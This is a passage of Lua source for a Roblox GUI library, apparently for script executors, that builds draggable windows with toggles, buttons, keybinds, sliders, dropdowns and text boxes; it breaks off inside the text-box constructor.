local library = {flags = {}, windows = {}, open = true}

local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local textService = game:GetService("TextService")
local inputService = game:GetService("UserInputService")

local dragging, dragInput, dragStart, startPos, dragObject

local blacklistedKeys = {
    Enum.KeyCode.Unknown,Enum.KeyCode.W,Enum.KeyCode.A,Enum.KeyCode.S,Enum.KeyCode.D,Enum.KeyCode.Slash,Enum.KeyCode.Tab,Enum.KeyCode.Backspace,Enum.KeyCode.Escape
}
local whitelistedMouseinputs = {
    Enum.UserInputType.MouseButton1,
    Enum.UserInputType.MouseButton2,
    Enum.UserInputType.MouseButton3,
    Enum.UserInputType.Touch
}

local function round(num, places)
    local power = 10^places
    return math.round(num * power) / power
end

local function keyCheck(x,x1)
    for _,v in next, x1 do
        if v == x then
            return true
        end
    end
end

local function update(input)
    local delta = input.Position - dragStart
    local yPos = (startPos.Y.Offset + delta.Y) < -36 and -36 or startPos.Y.Offset + delta.Y
    dragObject:TweenPosition(UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, yPos), "Out", "Quint", 0.1, true)
end

local chromaColor
local rainbowTime = 5
spawn(function()
    while wait() do
        chromaColor = Color3.fromHSV(tick() % rainbowTime / rainbowTime, 1, 1)
    end
end)

function library:Create(class, properties)
    properties = typeof(properties) == "table" and properties or {}
    local inst = Instance.new(class)
    for property, value in next, properties do
        inst[property] = value
    end
    return inst
end

function library:Draw(class, properties)
    local properties = type(properties) == 'table' and properties or {};
    local object = Drawing.new(class)
    for p, v in next, properties do 
        object[p] = v; 
    end
    return object
end

local function createOptionHolder(holderTitle, parent, parentTable, subHolder)
    local size = subHolder and 34 or 40
    parentTable.main = library:Create("ImageButton", {
        LayoutOrder = subHolder and parentTable.position or 0,
        Position = UDim2.new(0, 20 + (250 * (parentTable.position or 0)), 0, 20),
        Size = UDim2.new(0, 230, 0, size),
        BackgroundTransparency = 1,
        Draggable = true,
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.04,
        ClipsDescendants = true,
        Parent = parent
    })
    
    local round
    if not subHolder then
        round = library:Create("ImageLabel", {
            Size = UDim2.new(1, 0, 0, size),
            BackgroundTransparency = 1,
            Image = "rbxassetid://3570695787",
            ImageColor3 = parentTable.open and (subHolder and Color3.fromRGB(16, 16, 16) or Color3.fromRGB(10, 10, 10)) or (subHolder and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(6, 6, 6)),
            ScaleType = Enum.ScaleType.Slice,
            SliceCenter = Rect.new(100, 100, 100, 100),
            SliceScale = 0.04,
            Parent = parentTable.main
        })
    end
    
    local title = library:Create("TextLabel", {
        Size = UDim2.new(1, 0, 0, size),
        BackgroundTransparency = subHolder and 0 or 1,
        BackgroundColor3 = Color3.fromRGB(10, 10, 10),
        BorderSizePixel = 0,
        Text = holderTitle,
        TextSize = subHolder and 16 or 17,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = parentTable.main
    })
    
    local closeHolder = library:Create("TextButton", {
        Position = UDim2.new(1, 0, 0, 0),
        Size = UDim2.new(-1, 0, 1, 0),
        Text = "",
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        BackgroundTransparency = 1,
        Parent = title
    })
    
    local close = library:Create("ImageLabel", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.new(1, -size - 10, 1, -size - 10),
        Rotation = parentTable.open and 90 or 180,
        BackgroundTransparency = 1,
        Image = "rbxassetid://4918373417",
        ImageColor3 = parentTable.open and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(30, 30, 30),
        ScaleType = Enum.ScaleType.Fit,
        Parent = closeHolder
    })
    
    parentTable.content = library:Create("Frame", {
        Position = UDim2.new(0, 0, 0, size),
        Size = UDim2.new(1, 0, 1, -size),
        BackgroundTransparency = 1,
        Draggable = false,
        Parent = parentTable.main
    })
    
    local layout = library:Create("UIListLayout", {
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = parentTable.content
    })
    
    layout.Changed:connect(function()
        parentTable.content.Size = UDim2.new(1, 0, 0, layout.AbsoluteContentSize.Y)
        parentTable.main.Size = #parentTable.options > 0 and parentTable.open and UDim2.new(0, 230, 0, layout.AbsoluteContentSize.Y + size) or UDim2.new(0, 230, 0, size)
    end)
    
    if not subHolder then
        library:Create("UIPadding", {
            Parent = parentTable.content
        })
    end
    
    closeHolder.MouseButton1Click:Connect(function()
        parentTable.open = not parentTable.open
        tweenService:Create(close, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = parentTable.open and 90 or 180, ImageColor3 = parentTable.open and Color3.fromRGB(50, 50, 50) or Color3.fromRGB(30, 30, 30)}):Play()
        if subHolder then
            tweenService:Create(title, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = parentTable.open and Color3.fromRGB(16, 16, 16) or Color3.fromRGB(10, 10, 10)}):Play()
        else
            tweenService:Create(round, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = parentTable.open and Color3.fromRGB(10, 10, 10) or Color3.fromRGB(6, 6, 6)}):Play()
        end
        parentTable.main:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 230, 0, layout.AbsoluteContentSize.Y + size) or UDim2.new(0, 230, 0, size), "Out", "Quad", 0.2, true)
    end)

    function parentTable:SetTitle(newTitle)
        title.Text = tostring(newTitle)
    end
    
    return parentTable
end
    
local function createLabel(option, parent)
    local main1 = library:Create("TextLabel", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 26),
        BackgroundTransparency = 1,
        Name = "Label",
        Text = " " .. option.text,
        TextSize = 17,
        Active = true,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = parent.content
    })
    
    setmetatable(option, {__newindex = function(t, i, v)
        if i == "Text" then
            main1.Text = " " .. tostring(v)
        end
    end})
end

function createToggle(option, parent)
    local main2 = library:Create("TextButton", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 31),
        BackgroundTransparency = 1,
        Name = "Toggle",
        Text = " " .. option.text,
        TextSize = 17,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = parent.content
    })
    
    local tickboxOutline = library:Create("ImageLabel", {
        Position = UDim2.new(1, -6, 0, 4),
        Size = UDim2.new(-1, 10, 1, -10),
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        BackgroundTransparency = 1,
        Name = "Tickbox Outline",
        Image = "rbxassetid://3570695787",
        ImageColor3 = option.state and Color3.fromRGB(255, 65, 65) or Color3.fromRGB(100, 100, 100),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = main2
    })
    
    local tickboxInner = library:Create("ImageLabel", {
        Position = UDim2.new(0, 2, 0, 2),
        Size = UDim2.new(1, -4, 1, -4),
        BackgroundTransparency = 1,
        Name = "Tickbox Inner",
        Image = "rbxassetid://3570695787",
        ImageColor3 = option.state and Color3.fromRGB(255, 65, 65) or Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = tickboxOutline
    })
    
    local checkmarkHolder = library:Create("Frame", {
        Position = UDim2.new(0, 4, 0, 4),
        Size = option.state and UDim2.new(1, -8, 1, -8) or UDim2.new(0, 0, 1, -8),
        BackgroundTransparency = 1,
        Name = "Checkmark Holder",
        ClipsDescendants = true,
        Parent = tickboxOutline
    })
    
    local checkmark = library:Create("ImageLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        BackgroundTransparency = 1,
        Name = "Checkmark",
        Image = "rbxassetid://4919148038",
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        Parent = checkmarkHolder
    })
    
    main2.MouseButton1Click:Connect(function()
        option:SetState(not option.state)
    end)
    
    function option:SetState(state)
        library.flags[self.flag] = state
        self.state = state
        checkmarkHolder:TweenSize(option.state and UDim2.new(1, -8, 1, -8) or UDim2.new(0, 0, 1, -8), "Out", "Quad", 0.2, true)
        tweenService:Create(tickboxInner, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = state and Color3.fromRGB(255, 65, 65) or Color3.fromRGB(20, 20, 20)}):Play()
        if state then
            tweenService:Create(tickboxOutline, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()
        else
            tweenService:Create(tickboxOutline, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(100, 100, 100)}):Play()
        end
        self.callback(state)
    end

    if option.state then
        delay(1, function() option.callback(true) end)
    end
    
    setmetatable(option, {__newindex = function(t, i, v)
        if i == "Text" then
            main2.Text = " " .. tostring(v)
        end
    end})
end

function createButton(option, parent)
    local main3 = library:Create("TextButton", {
        ZIndex = 2,
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 34),
        Name = "Button",
        BackgroundTransparency = 1,
        Text = " " .. option.text,
        TextSize = 17,
    	Draggable = false,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = parent.content
    })
    
    local round = library:Create("ImageLabel", {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.new(0.5, 0, 0.5, 0),
        Size = UDim2.new(1, -12, 1, -10),
        BackgroundTransparency = 1,
        Name = "Round",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(40, 40, 40),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = main3
    })

    main3.MouseButton1Click:Connect(function()
        library.flags[option.flag] = true
    	tweenService:Create(round, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()
        repeat task.wait() until round.ImageColor3 == Color3.fromRGB(255, 65, 65)
    	tweenService:Create(round, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(40, 40, 40)}):Play()
    	option.callback()
    end)
end
	
local function createBind(option, parent)
    local binding
    local holding
    local loop
    local text = string.match(option.key, "Mouse") and string.sub(option.key, 1, 5) .. string.sub(option.key, 12, 13) or option.key

    local main4 = library:Create("TextLabel", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 33),
        Name = "Bind",
        BackgroundTransparency = 1,
        Text = " " .. option.text,
        TextSize = 17,
        Active = true,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = parent.content
    })
    
    local round = library:Create("ImageLabel", {
        Position = UDim2.new(1, -6, 0, 4),
        Size = UDim2.new(0, -textService:GetTextSize(text, 16, Enum.Font.FredokaOne, Vector2.new(9e9, 9e9)).X - 16, 1, -10),
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        BackgroundTransparency = 1,
        Name = "Round",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(40, 40, 40),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = main4
    })
    
    local bindinput = library:Create("TextLabel", {
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        Name = "Bind Input",
        Text = text,
        TextSize = 16,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        Parent = round
    })
    
    local inContact
    main4.InputBegan:connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            inContact = true
            if not binding then
                tweenService:Create(round, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
            end
        end
    end)
     
    main4.InputEnded:connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            binding = true
            bindinput.Text = "..."
            tweenService:Create(round, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()
        end
        if input.UserInputType == Enum.UserInputType.MouseMovement then
            inContact = false
            if not binding then
                tweenService:Create(round, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(40, 40, 40)}):Play()
            end
        end
    end)
    
    inputService.InputBegan:connect(function(input)
        if inputService:GetFocusedTextBox() then return end
        if (input.KeyCode.Name == option.key or input.UserInputType.Name == option.key) and not binding then
            if option.hold then
                loop = runService.Heartbeat:connect(function()
                    if binding then
                        option.callback(true)
                        loop:Disconnect()
                        loop = nil
                    else
                        option.callback()
                    end
                end)
            else
                option.callback()
            end
        elseif binding then
            local key
            pcall(function()
                if not keyCheck(input.KeyCode, blacklistedKeys) then
                    key = input.KeyCode
                end
            end)
            pcall(function()
                if keyCheck(input.UserInputType, whitelistedMouseinputs) and not key then
                    key = input.UserInputType
                end
            end)
            key = key or option.key
            option:SetKey(key)
        end
    end)
    
    inputService.InputEnded:connect(function(input)
        if input.KeyCode.Name == option.key or input.UserInputType.Name == option.key or input.UserInputType.Name == "MouseMovement" then
            if loop then
                loop:Disconnect()
                loop = nil
                option.callback(true)
            end
        end
    end)
    
    function option:SetKey(key)
        binding = false
        if loop then
            loop:Disconnect()
            loop = nil
        end
        self.key = key or self.key
        self.key = self.key.Name or self.key
        library.flags[self.flag] = self.key
        if string.match(self.key, "Mouse") then
            bindinput.Text = string.sub(self.key, 1, 5) .. string.sub(self.key, 12, 13)
        else
            bindinput.Text = self.key
        end
        tweenService:Create(round, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = inContact and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(40, 40, 40)}):Play()
        round.Size = UDim2.new(0, -textService:GetTextSize(bindinput.Text, 15, Enum.Font.FredokaOne, Vector2.new(9e9, 9e9)).X - 16, 1, -10) 
    end
end

local function createSlider(option, parent)
	local main5 = library:Create("Frame", {
		LayoutOrder = option.position,
		Size = UDim2.new(1, 0, 0, 50),
		BackgroundTransparency = 1,
        Active = true,
		Parent = parent.content
	})
	
	local title = library:Create("TextLabel", {
		Position = UDim2.new(0, 0, 0, 4),
		Size = UDim2.new(1, 0, 0, 20),
		BackgroundTransparency = 1,
		Text = " " .. option.text,
		TextSize = 17,
		Font = Enum.Font.FredokaOne,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextXAlignment = Enum.TextXAlignment.Left,
		Parent = main5
	})
	
	local slider = library:Create("ImageLabel", {
		Position = UDim2.new(0, 10, 0, 34),
		Size = UDim2.new(1, -20, 0, 5),
		BackgroundTransparency = 1,
		Image = "rbxassetid://3570695787",
		ImageColor3 = Color3.fromRGB(30, 30, 30),
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(100, 100, 100, 100),
		SliceScale = 0.02,
		Parent = main5
	})
	
	local fill = library:Create("ImageLabel", {
		BackgroundTransparency = 1,
		Image = "rbxassetid://3570695787",
		ImageColor3 = Color3.fromRGB(60, 60, 60),
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(100, 100, 100, 100),
		SliceScale = 0.02,
		Parent = slider
	})
	
	local circle = library:Create("ImageLabel", {
		AnchorPoint = Vector2.new(0.5, 0.5),
		Position = UDim2.new((option.value - option.min) / (option.max - option.min), 0, 0.5, 0),
		SizeConstraint = Enum.SizeConstraint.RelativeYY,
		BackgroundTransparency = 1,
		Image = "rbxassetid://3570695787",
		ImageColor3 = Color3.fromRGB(60, 60, 60),
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(100, 100, 100, 100),
		SliceScale = 1,
		Parent = slider
	})
	
	local valueRound = library:Create("ImageLabel", {
		Position = UDim2.new(1, -6, 0, 4),
		Size = UDim2.new(0, -60, 0, 18),
		BackgroundTransparency = 1,
		Image = "rbxassetid://3570695787",
		ImageColor3 = Color3.fromRGB(40, 40, 40),
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(100, 100, 100, 100),
		SliceScale = 0.02,
		Parent = main5
	})
	
	local inputvalue = library:Create("TextBox", {
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundTransparency = 1,
		Text = option.value,
		TextColor3 = Color3.fromRGB(235, 235, 235),
		TextSize = 15,
		TextWrapped = true,
		Font = Enum.Font.FredokaOne,
		Parent = valueRound
	})
	
	if option.min >= 0 then
		fill.Size = UDim2.new((option.value - option.min) / (option.max - option.min), 0, 1, 0)
	else
		fill.Position = UDim2.new((0 - option.min) / (option.max - option.min), 0, 0, 0)
		fill.Size = UDim2.new(option.value / (option.max - option.min), 0, 1, 0)
	end
	
	local inContact
	main5.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			tweenService:Create(fill, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()
			tweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(3.5, 0, 3.5, 0), ImageColor3 = Color3.fromRGB(255, 65, 65)}):Play()      
			dragging = true
			option:SetValue(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
		end
	end)
	
	inputService.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch and dragging then
			option:SetValue(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
		end
	end)

	main5.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = false
			if inContact then
				tweenService:Create(fill, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(100, 100, 100)}):Play()
				tweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(2.8, 0, 2.8, 0), ImageColor3 = Color3.fromRGB(100, 100, 100)}):Play()
			else
				tweenService:Create(fill, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
				tweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0), ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
			end
		end
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			inContact = false
			inputvalue:ReleaseFocus()
			if not dragging then
				tweenService:Create(fill, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
				tweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0), ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
			end
		end
	end)

	inputvalue.FocusLost:connect(function()
		tweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0, 0), ImageColor3 = Color3.fromRGB(60, 60, 60)}):Play()
		option:SetValue(tonumber(inputvalue.Text) or option.value)
	end)

	function option:SetValue(value)
		value = round(value, option.float)
		value = math.clamp(value, self.min, self.max)
		circle:TweenPosition(UDim2.new((value - self.min) / (self.max - self.min), 0, 0.5, 0), "Out", "Quad", 0.1, true)
		if self.min >= 0 then
			fill:TweenSize(UDim2.new((value - self.min) / (self.max - self.min), 0, 1, 0), "Out", "Quad", 0.1, true)
		else
			fill:TweenPosition(UDim2.new((0 - self.min) / (self.max - self.min), 0, 0, 0), "Out", "Quad", 0.1, true)
			fill:TweenSize(UDim2.new(value / (self.max - self.min), 0, 1, 0), "Out", "Quad", 0.1, true)
		end
		library.flags[self.flag] = value
		self.value = value
		inputvalue.Text = value
		self.callback(value)
	end
end

local function createList(option, parent, holder)
    local valueCount = 0
    
    local main6 = library:Create("Frame", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 52),
        Name = "Dropdown",
        BackgroundTransparency = 1,
    	Draggable = false,
        Parent = parent.content
    })
    
    local round = library:Create("ImageButton", {
        Position = UDim2.new(0, 6, 0, 4),
        Size = UDim2.new(1, -12, 1, -10),
        BackgroundTransparency = 1,
        Name = "Round",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(40, 40, 40),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = main6
    })
    
    local title = library:Create("TextLabel", {
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(1, -24, 0, 14),
        BackgroundTransparency = 1,
        Name = "Title",
        Text = option.text,
        TextSize = 14,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(140, 140, 140),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = main6
    })
    
    local listvalue = library:Create("TextLabel", {
        Position = UDim2.new(0, 12, 0, 20),
        Size = UDim2.new(1, -24, 0, 24),
        BackgroundTransparency = 1,
        Name = "List Value",
        Text = option.value,
        TextSize = 18,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = main6
    })
    
    local CloseDowndrop = library:Create("ImageLabel", {
        Position = UDim2.new(1, -16, 0, 16),
        Size = UDim2.new(-1, 32, 1, -32),
        Name = "Close",
        SizeConstraint = Enum.SizeConstraint.RelativeYY,
        Rotation = 180,
        BackgroundTransparency = 1,
        Image = "rbxassetid://4918373417",
        ImageColor3 = Color3.fromRGB(140, 140, 140),
        ScaleType = Enum.ScaleType.Fit,
        Parent = round
    })
    
    option.mainHolder = library:Create("ImageButton", {
        LayoutOrder = option.position,
        ZIndex = 3,
        Size = UDim2.new(0, 240, 0, 52),
        BackgroundTransparency = 1,
        Image = "rbxassetid://3570695787",
        ImageTransparency = 1,
        ImageColor3 = Color3.fromRGB(30, 30, 30),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Visible = false,
        Parent = parent.content
    })
    
    local content = library:Create("ScrollingFrame", {
        ZIndex = 3,
        Size = UDim2.new(1, 0, 1, 0),
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        ScrollBarImageColor3 = Color3.fromRGB(),
        ScrollBarThickness = 0,
        ScrollingDirection = Enum.ScrollingDirection.Y,
        Parent = option.mainHolder
    })
    
    library:Create("UIPadding", {
        PaddingTop = UDim.new(0, 6),
        Parent = content
    })
    
    local layout = library:Create("UIListLayout", {
        Parent = content
    })
    
    layout.Changed:connect(function()
        option.mainHolder.Size = UDim2.new(0, 240, 0, (valueCount > 4 and (4 * 40) or layout.AbsoluteContentSize.Y) + 12)
        content.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 12)
    end)

    local ToggleDropdown = false

    round.MouseButton1Click:Connect(function()
        ToggleDropdown = not ToggleDropdown
        if ToggleDropdown then
            local position = main6.AbsolutePosition
            option.mainHolder.Position = UDim2.new(0, position.X - 5, 0, position.Y - 10)
            option.open = true
            option.mainHolder.Visible = true
            content.ScrollBarThickness = 6
            tweenService:Create(option.mainHolder, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0, Position = UDim2.new(0, position.X - 5, 0, position.Y - 4)}):Play()
            tweenService:Create(CloseDowndrop, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = 90}):Play()
            tweenService:Create(option.mainHolder, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, 0.1), {Position = UDim2.new(0, position.X - 5, 0, position.Y + 1)}):Play()
            for _,button in next, content:GetChildren() do
                if button:IsA("TextButton") then
                    tweenService:Create(button, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
                end
            end
        else            
            local position = main6.AbsolutePosition
            option.open = false
            content.ScrollBarThickness = 0
            tweenService:Create(option.mainHolder, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 1, Position = UDim2.new(0, position.X - 5, 0, position.Y - 10)}):Play()
            for _,button in next, content:GetChildren() do
                if button:IsA("TextButton") then
                    tweenService:Create(button, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
                end
            end
            wait(0.3)
            option.mainHolder.Visible = false
            tweenService:Create(CloseDowndrop, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = 180}):Play()
        end
    end)
    
    local TAB_CONST = string.rep(' ', 4)
    function option:AddValue(value)
        valueCount = valueCount + 1
        local button = library:Create("TextButton", {
            ZIndex = 3,
            Size = UDim2.new(1, 0, 0, 40),
            BackgroundColor3 = Color3.fromRGB(30, 30, 30),
            BorderSizePixel = 0,
            Text = TAB_CONST .. value,
            TextSize = 14,
            TextTransparency = self.open and 0 or 1,
            Font = Enum.Font.FredokaOne,
            TextColor3 = Color3.fromRGB(255, 255, 255),
            TextXAlignment = Enum.TextXAlignment.Left,
            Parent = content
        })

        button.MouseButton1Click:Connect(function()
            self:SetValue(value)
            local position = main.AbsolutePosition
            option.open = false
            content.ScrollBarThickness = 0
            tweenService:Create(option.mainHolder, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 1, Position = UDim2.new(0, position.X - 5, 0, position.Y - 10)}):Play()
            for _,button in next, content:GetChildren() do
                if button:IsA("TextButton") then
                    tweenService:Create(button, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
                end
            end
            wait(0.3)
            option.mainHolder.Visible = false
            tweenService:Create(CloseDowndrop, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = 180}):Play()
        end)

        if not table.find(option.values, value) then
            table.insert(option.values, value)
        end
    end

    if not table.find(option.values, option.value) then
        option:AddValue(option.value)
    end
    
    for _, value in next, option.values do
        option:AddValue(tostring(value))
    end
    
    function option:RemoveValue(value)
        for _,button in next, content:GetChildren() do
            if button:IsA("TextButton") and button.Text == (TAB_CONST .. value) then
                button:Destroy()
                valueCount = valueCount - 1
                break
            end
        end

        if self.value == value then
            self:SetValue("")
        end
    end
    
    function option:SetValue(value)
        library.flags[self.flag] = tostring(value)
        self.value = tostring(value)
        listvalue.Text = self.value
        self.callback(value)
    end
    
    return option
end

local function createBox(option, parent)
    local main7 = library:Create("Frame", {
        LayoutOrder = option.position,
        Size = UDim2.new(1, 0, 0, 52),
        Name = "Textbox",
        BackgroundTransparency = 1,
    	Draggable = false,
        Parent = parent.content
    })
    
    local outline = library:Create("ImageLabel", {
        Position = UDim2.new(0, 6, 0, 4),
        Size = UDim2.new(1, -12, 1, -10),
        BackgroundTransparency = 1,
        Name = "Outline",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(60, 60, 60),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.02,
        Parent = main7
    })
    
    local round = library:Create("ImageLabel", {
        Position = UDim2.new(0, 8, 0, 6),
        Size = UDim2.new(1, -16, 1, -14),
        BackgroundTransparency = 1,
        Name = "Round",
        Image = "rbxassetid://3570695787",
        ImageColor3 = Color3.fromRGB(20, 20, 20),
        ScaleType = Enum.ScaleType.Slice,
        SliceCenter = Rect.new(100, 100, 100, 100),
        SliceScale = 0.01,
        Parent = main7
    })
    
    local title = library:Create("TextLabel", {
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(1, -24, 0, 14),
        BackgroundTransparency = 1,
        Name = "Title",
        Text = option.text,
        TextSize = 14,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(100, 100, 100),
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = main7
    })
    
    local inputvalue = library:Create("TextBox", {
        Position = UDim2.new(0, 12, 0, 20),
        Size = UDim2.new(1, -24, 0, 24),
        BackgroundTransparency = 1,
        Name = "Input Value",
        Text = option.value,
        TextSize = 18,
        Font = Enum.Font.FredokaOne,
        TextColor3 = Color3.fromRGB(255, 255, 255),
        TextXAlignment = Enum.TextXAlignment.Left,
        TextWrapped = true,
        Parent = main7
    })
    
    local inContact
    local focused
    main7.InputBegan:Connect(function(input)
